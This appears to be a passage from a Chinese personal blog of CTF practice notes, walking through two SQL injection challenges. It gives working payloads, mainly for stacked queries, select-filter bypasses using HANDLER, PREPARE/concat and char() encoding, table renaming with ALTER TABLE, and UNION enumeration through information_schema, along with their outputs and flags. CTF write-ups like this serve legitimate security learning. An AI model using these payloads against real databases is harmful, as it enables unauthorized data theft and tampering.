<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27;show">http://210.30.97.133:28043/?inject=1&#39;;show</a> columns from words;# 没有flag</p>
<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28085/?inject=1%27;show">http://210.30.97.133:28085/?inject=1&#39;;show</a> columns from `1919810931114514`;# &#x3D;&#x3D;反单引号括住&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>?inject&#x3D;1’;select flag from flag;# 会过滤select，到这没思路去看<a href=https://blog.csdn.net/weixin_44632787/article/details/118737571>wp</a>了</p>
<p>方法一：MySQL中查询语句handler：</p>
<ol>
<li><code>handler 【表名】 open;</code> &#x2F;&#x2F; 打开某个表</li>
<li><code>handler 【表名】 read first || next;</code> &#x2F;&#x2F; 读取表里第一行或者下一行的数据</li>
<li><code>handler 【表名】 close;</code> &#x2F;&#x2F; 关闭该表</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler `1919810931114514` open;</span><br><span class="line">handler `1919810931114514` read first;</span><br><span class="line">handler `1919810931114514` close;</span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<ol>
<li><code>PREPARE 【自定义名】 FROM 【自定义的SQL查询语句】;</code>&#x2F;&#x2F;生成</li>
<li><code>EXECUTE 【自定义名】;//执行</code></li>
<li><code>DEALLOCATE PREPARE 【自定义名】;</code>&#x2F;&#x2F;释放</li>
</ol>
<p>由于select被过滤，concat绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE Hack_SQL from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);</span><br><span class="line">EXECUTE Hack_SQL;</span><br><span class="line">DEALLOCATE PREPARE Hack_SQL;</span><br></pre></td></tr></table></figure>

<p>或者ascii编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE Hack_SQL from concat(char(115,101,108,101,99,116), &#x27; * from `1919810931114514`&#x27;);</span><br><span class="line">EXECUTE Hack_SQL;</span><br><span class="line">DEALLOCATE PREPARE Hack_SQL;#</span><br></pre></td></tr></table></figure>

<p>方法三</p>
<p>由于前端提供查询的数据库为words，但是flag在数据库1919810931114514里。并且可以猜测后台的SQL查询语句为：select * from words where id&#x3D;【你输入的id】</p>
<p>1.所以我们需要先将数据库words改成其它的数据库名<br>2.再把数据库1919810931114514改名为words<br>3.并且把（改名前）1919810931114514数据库的字段flag改名成id</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alter table words rename to words1;</span><br><span class="line">alter table `1919810931114514` rename to words;</span><br><span class="line">alter table words change flag id varchar(100);</span><br></pre></td></tr></table></figure>

<p>改完之后输入?inject&#x3D;1’ or 1&#x3D;1;   显示flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(42) &quot;flag&#123;590b74d2-2d4d-41f7-bb0e-137622e5043b&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44632787/article/details/118737571">https://blog.csdn.net/weixin_44632787/article/details/118737571</a></p>
</blockquote>
<h2 id="SSSCTF2023-YUAN’S-SQL"><a href="#SSSCTF2023-YUAN’S-SQL" class="headerlink" title="SSSCTF2023-YUAN’S SQL"></a>SSSCTF2023-YUAN’S SQL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM jiuzhe WHERE id = &quot;</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<p>提示：闭合方式是(id)</p>
<p>发现注释符好像没有用，手动闭合</p>
<p>&#x3D;&#x3D;?id&#x3D;1) or (1&#x3D;1&#x3D;&#x3D;  给了个fake flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; Array ( [id] =&gt; 3 [username] =&gt; A306 [password] =&gt; where_is_flag ) [1] =&gt; Array ( [id] =&gt; 4 [username] =&gt; Fake_F1ag [password] =&gt; sssctf&#123;f11lag_is_not_there_hahaha&#125; ) )</span><br></pre></td></tr></table></figure>

<p>试了试id&#x3D;3，发现有回显，测试注入点</p>
<p>&#x3D;&#x3D;?id&#x3D;3)–+&#x3D;&#x3D;  Array ( [0] &#x3D;&gt; Array ( [id] &#x3D;&gt; 3 [username] &#x3D;&gt; A306 [password] &#x3D;&gt; where_is_flag ) )</p>
<p>?id&#x3D;3) group by 4–+无回显，3有回显，3列</p>
<p>?id&#x3D;3) union select 1,2,database()–+Array ( [id] &#x3D;&gt; 1 [username] &#x3D;&gt; 2 [password] &#x3D;&gt; &#x3D;&#x3D;dutctf&#x3D;&#x3D; ) </p>
<p>?id&#x3D;3) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’dutctf’–+</p>
<p>查表</p>
<p> Array ( [id] &#x3D;&gt; 1[username] &#x3D;&gt; 2 [password] &#x3D;&gt; &#x3D;&#x3D;jiuzhe,users&#x3D;&#x3D;) )</p>
<p>查列</p>
<p>?id&#x3D;3) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;’dutctf’ and table_name&#x3D;’users’–+</p>
<p>Array ( [id] &#x3D;&gt; 1 [username] &#x3D;&gt; 2 [password] &#x3D;&gt; id,&#x3D;&#x3D;username,password&#x3D;&#x3D; ) </p>
<p>查数据</p>
<p>?id&#x3D;3) union select 1,2,group_concat(username,password) from users–+</p>
<p>Array ( [id] &#x3D;&gt; 1 [username] &#x3D;&gt; 2 [password] &#x3D;&gt; scr1wOHHHHHHH,Flag&#x3D;&#x3D;flag{c39ee9a1-5a6f-41c4-9789-909ab2d1ba1d}&#x3D;&#x3D; )</p>
<p>学过了再来复现新生赛，很有成就感╰(￣▽￣)╭</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tag/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" style="color: #00bcd4">ctf刷题日记</a>
        </span>
        
    </div>
    <a href="/article/2623458554/" class="go-post">阅读全文</a>
</div>


        <div class="page-current">
    
    <a class="page-num" href="/">
        <i class="fa-solid fa-caret-left fa-fw"></i>
    </a>
    <a class="page-num" href="/">1</a>
    <span class="page-omit">...</span>
    
    <span class="current">2</span>
    
    <a class="page-num" href="/page/3">
        3
    </a>
    
    
    
    
    <a class="page-num" href="/page/3/">
        <i class="fa-solid fa-caret-right fa-fw"></i>
    </a>
    
</div>

    </div>
    
    <div id="home-card">
        <div id="card-style">
    <div id="card-div">
        <div class="avatar">
            <img src="/images/avatar.jpg" alt="avatar" />
        </div>
        <div class="name">Live For Code</div>
        <div class="description">
            <p>Description<br>…</p>

        </div>
        
        
        <div class="friend-links">
            
            <div class="friend-link">
                <a target="_blank" rel="noopener" href="https://argvchs.github.io">Argvchs</a>
            </div>
            
        </div>
        
    </div>
</div>

    </div>
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 Live For Code
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;Live For Code
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
</body>
</html>
